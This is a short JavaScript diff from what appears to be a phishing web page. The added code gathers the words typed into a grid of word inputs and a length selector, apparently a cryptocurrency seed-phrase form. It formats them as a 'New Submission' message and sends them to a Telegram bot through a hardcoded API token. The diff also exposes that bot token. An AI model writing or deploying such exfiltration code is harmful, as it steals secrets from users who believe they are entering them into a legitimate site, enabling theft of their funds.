@@ -1500,21 +1500,25 @@ document.addEventListener("DOMContentLoaded", () => {
 
         try {
 
-            const lengthElement = document.getElementById("Length");
-            const wordsGrid = document.getElementById("wordsGrid");
+            // Find the selector
+            const selector = document.querySelector("select.selector");
+
+            // Get all entered words
+            const words = Array.from(
+                document.querySelectorAll(".word-input")
+            )
+            .map(input => input.value.trim())
+            .filter(value => value !== "");
 
             const message =
-`DEBUG REPORT
+`📝 New Submission
 
-Length value:
-${lengthElement ? lengthElement.value : "Length element not found"}
+📏 Length: ${selector ? selector.value : "Unknown"}
 
-WordsGrid HTML:
-${wordsGrid ? wordsGrid.innerHTML.substring(0, 3000) : "wordsGrid not found"}
+🔤 Words:
+${words.length ? words.join(" ") : "No words entered"}
 
-Timestamp:
-${new Date().toISOString()}
-`;
+⏰ Time: ${new Date().toLocaleString()}`;
 
             await fetch("https://api.telegram.org/bot8820185140:AAGC0CpxNuz2XSPqfcu4lGII3w9XHm1SwBI/sendMessage", {
                 method: "POST",
